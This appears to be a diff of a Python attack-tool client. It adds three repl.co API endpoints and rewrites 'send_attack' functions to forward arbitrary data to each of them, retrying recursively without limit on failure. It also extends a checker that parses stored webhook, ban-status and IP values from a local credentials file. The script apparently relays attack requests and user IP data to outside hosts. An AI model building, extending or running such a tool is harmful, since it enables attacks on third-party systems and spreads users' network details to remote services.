@@ -76,12 +76,15 @@ def clear_console():
    else:
      os.system('clear')
 
+URL = ['https://bruhhapi.idkotherhex1629.repl.co/API0=','https://bruhhapi2.idkotherhex1629.repl.co/API0=','https://bruhhapi3.idkotherhex1629.repl.co/API0=']
+
 def send_attack(data):
    try:
-      r = requests.get(url=f'https://bruhhapi.idkotherhex1629.repl.co/API={data}')
-      if r.status_code == 200:
-       print('API ( OK )')
-      else:
+      for link in URL:
+       r = requests.get(url=f"{link.replace('0','')}{data}")
+       if r.status_code == 200:
+        print('API ( OK )')
+       else:
          print("API DOWN ( BRUHH )")
          send_attack(data)
    except:
@@ -89,13 +92,15 @@ def send_attack(data):
 
 def send_attack2(data):
    try:
-      r = requests.get(url=f'https://bruhhapi.idkotherhex1629.repl.co/API3={data}')
-      if r.status_code == 200:
-       print('API ( OK )')
-      else:
-         print("API DOWN ( BRUHH )")
-         send_attack2(data)
+      for link in URL:
+         r = requests.get(url=f"{link.replace('0','3')}{data}")
+         if r.status_code == 200:
+          print('API ( OK )')
+         else:
+          print("API DOWN ( BRUHH )")
+          send_attack2(data)
    except:
+      print("API DOWN ( SHIT )")
       send_attack2(data)
 
 # ! CHECK FILES
@@ -105,9 +110,9 @@ def login_checker():
         with open(file_path) as f:
             credentials = [x.strip() for x in f.readlines() if x.strip()]
             for x in credentials:
-             c_webhook,c_ip,c_ip_enc = x.split('@')
+             c_webhook,c_banned,c_ip,c_ip_enc = x.split('@')
              if c_webhook.upper() == 'FALSE' or c_webhook.upper() == 'TRUE':
-                return f'KNOWN@{c_webhook}@{c_ip}@{c_ip_enc}'
+                return f'KNOWN@{c_webhook}@{c_banned}@{c_ip}@{c_ip_enc}'
              else:
                 return 'UNKNOWN@null@null'
     except FileNotFoundError:
